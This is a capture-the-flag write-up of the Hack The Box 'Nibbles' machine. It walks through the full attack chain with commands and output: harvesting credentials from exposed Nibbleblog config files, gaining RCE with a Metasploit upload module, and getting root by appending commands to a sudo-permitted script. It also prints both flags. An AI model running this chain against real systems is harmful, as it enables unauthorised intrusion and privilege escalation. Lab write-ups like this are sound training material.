---
date: 2024-10-22
title: Hack The Box — Nibbles
categories:
  - Writeups
  - HTB
  - CTF
tags:
  - file_upload
  - nibbleblog
  - metasploit
  - linux
media_subpath: /assets/images
image: nibbles.png
---
# TL;DR

The HackTheBox machine "Nibbles" is an easy Linux box featuring a vulnerable Nibbleblog CMS (version 4.0.3) on an Apache web server. Initial access is gained by exploiting a directory traversal vulnerability to retrieve configuration files, revealing the admin credentials (`admin:nibbles`). These credentials are used with a Metasploit module to exploit an arbitrary file upload vulnerability, achieving remote code execution (RCE) as the `nibbler` user. The user flag is retrieved from the `nibbler` home directory. Root access is obtained by leveraging a misconfigured sudo permission, allowing the `nibbler` user to run a script (`monitor.sh`) as root without a password, which is modified to execute arbitrary commands and retrieve the root flag.

## Initial Enumeration

### Nmap Scan

Reconnaissance began with an Nmap scan to identify open ports, services, and version information on the target machine (IP: 10.129.240.184).

The command used was:

```bash
nmap -sC -sV --open -A -oA nibbles_initial_nmap_scan 10.129.240.184
```

- `-sC`: Runs default scripts for additional information.
- `-sV`: Probes for service versions.
- `-A`: Enables OS detection, version detection, script scanning, and traceroute.
- `--open`: Shows only open ports.
- `-oA`: Outputs results in all formats for later reference.

**Results:**

```bash
Nmap scan report for 10.129.240.184
Host is up (0.12s latency).
Not shown: 654 filtered tcp ports (no-response), 344 closed tcp ports (conn-refused)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Nmap done: 1 IP address (1 host up) scanned in 39.78 seconds
```

**Notes:**

- **SSH (Port 22)**: Running OpenSSH 7.2p2 on Ubuntu, suggesting Ubuntu 16.04 (Xenial Xerus). No immediate vulnerabilities without credentials.
- **HTTP (Port 80)**: Apache 2.4.18, a common web server. The site lacks a title, and a `curl` request to `http://10.129.240.184` returned a simple "Hello World!" page.
- No domain was specified, but `nibbles.htb` was later added to `/etc/hosts` after discovering the Nibbleblog CMS:
    
    ```bash
    echo "10.129.240.184 nibbles.htb" | sudo tee -a /etc/hosts
    ```
    
- Only ports 22 and 80 were open, focusing the attack surface on the web service.

---

## Web Enumeration

### Main Page

Navigating to `http://10.129.240.184/` revealed a minimal "Hello World!" page. Inspecting the source code uncovered a comment:

```html
<!-- /nibbleblog/ directory. Nothing interesting here! -->
```

This hinted at a Nibbleblog CMS installation at `http://10.129.240.184/nibbleblog/`.

Visiting `http://10.129.240.184/nibbleblog/` displayed a basic blog site powered by Nibbleblog, with a footer stating "Powered by Nibbleblog."

### Directory Enumeration

Directory brute-forcing was performed using Gobuster to uncover hidden paths:

```bash
gobuster dir -u http://10.129.240.184/nibbleblog/ -w /usr/share/dirb/wordlists/common.txt
```

**Results:**

```
/admin
/admin.php
/content
/index.php
/languages
/plugins
/README
/themes
```

Key findings:

- **/admin.php**: Admin login page for Nibbleblog.
- **/content**: Directory containing blog data, potentially sensitive.

Manual enumeration of `/content/private/` revealed:

- **/content/private/users.xml**: Exposed an `admin` user.
- **/content/private/config.xml**: Contained potential passwords: `yum yum` and `nibbles`.

```bash
curl http://10.129.240.184/nibbleblog/content/private/users.xml
curl http://10.129.240.184/nibbleblog/content/private/config.xml
```

### Vulnerability Research

Searched for known vulnerabilities in Nibbleblog using Searchsploit:

```bash
searchsploit nibbleblog
```

**Results:**

```
Nibbleblog 3 - Multiple SQL Injections  | php/webapps/35865.txt
Nibbleblog 4.0.3 - Arbitrary File Upload (Metasploit)  | php/remote/38489.rb
```

The arbitrary file upload vulnerability in Nibbleblog 4.0.3 (Metasploit module) was relevant, but required valid admin credentials.

---

## Authentication

Tested the potential credentials from `config.xml` on the admin login page (`http://10.129.240.184/nibbleblog/admin.php`):

- **Credentials:** `admin:nibbles` succeeded, granting access to the Nibbleblog admin panel.

The admin panel allowed management of posts, plugins, and file uploads, aligning with the Metasploit module’s requirements.

---

## Exploitation

### Metasploit Arbitrary File Upload

Used Metasploit to exploit the Nibbleblog 4.0.3 arbitrary file upload vulnerability:

```bash
msfconsole
use multi/http/nibbleblog_file_upload
set RHOSTS 10.129.240.184
set USERNAME admin
set PASSWORD nibbles
run
```

The module uploaded a malicious PHP file via the `my_image` plugin, achieving remote code execution (RCE) and spawning a Meterpreter session as the `nibbler` user:

```bash
(Meterpreter 1)(/var/www/html/nibbleblog/content/private/plugins/my_image) > getuid
Server username: nibbler
```

### Shell Upgrade

Upgraded the Meterpreter session to an interactive shell:

```bash
shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

This provided a stable TTY for further enumeration.

---

## Local Enumeration & User Flag

As the `nibbler` user, enumerated the home directory:

```bash
ls /home/nibbler
```

Found:

- **user.txt**: Contained the user flag: `79c03865431abf47b90ef24b9695e148`.
- **personal.zip**: A zip file in `/home/nibbler`.

Extracted `personal.zip`:

```bash
unzip /home/nibbler/personal.zip -d /tmp/personal
```

The zip contained a script at `/home/nibbler/personal/stuff/monitor.sh`, which appeared to be a monitoring script but lacked immediate exploitable content.

---

## Privilege Escalation

Checked for sudo permissions:

```bash
sudo -l
```

**Output:**

```
User nibbler may run the following commands on nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```

The `nibbler` user could execute `/home/nibbler/personal/stuff/monitor.sh` as root without a password, indicating a privilege escalation opportunity.

### Exploiting monitor.sh

Backed up the original script:

```bash
cp /home/nibbler/personal/stuff/monitor.sh /home/nibbler/personal/stuff/monitor.sh.bak
```

Modified `monitor.sh` to execute a command to read the root flag:

```bash
echo "cat /root/root.txt" >> /home/nibbler/personal/stuff/monitor.sh
```

Ran the script with sudo:

```bash
sudo /home/nibbler/personal/stuff/monitor.sh
```

**Output:**

```
de5e5d6619862a8aa5b9b212314e0cdd
```

The root flag was retrieved.

Alternatively, for a root shell:

```bash
echo "bash -i" >> /home/nibbler/personal/stuff/monitor.sh
sudo /home/nibbler/personal/stuff/monitor.sh
```

This provided an interactive root shell.

---

## Summary

| Step                 | Description                                                                                                              |
| -------------------- | ------------------------------------------------------------------------------------------------------------------------ |
| Enumeration          | Nmap revealed SSH (22) and Apache (80). Found Nibbleblog CMS via source code comment.                                    |
| Web Recon            | Gobuster identified `/nibbleblog/` directories. Retrieved `users.xml` and `config.xml` with credentials `admin:nibbles`. |
| Authentication       | Logged into Nibbleblog admin panel with `admin:nibbles`.                                                                 |
| Exploitation         | Used Metasploit’s `nibbleblog_file_upload` to upload a malicious PHP file, gaining an RCE shell as `nibbler`.            |
| User Flag            | Retrieved user flag (`79c03865431abf47b90ef24b9695e148`) from `/home/nibbler/user.txt`.                                  |
| Privilege Escalation | Exploited `sudo` permission on `monitor.sh` (NOPASSWD) by appending a command to read `/root/root.txt`.                  |
| Root Access          | Captured root flag (`de5e5d6619862a8aa5b9b212314e0cdd`) via modified `monitor.sh`.                                       |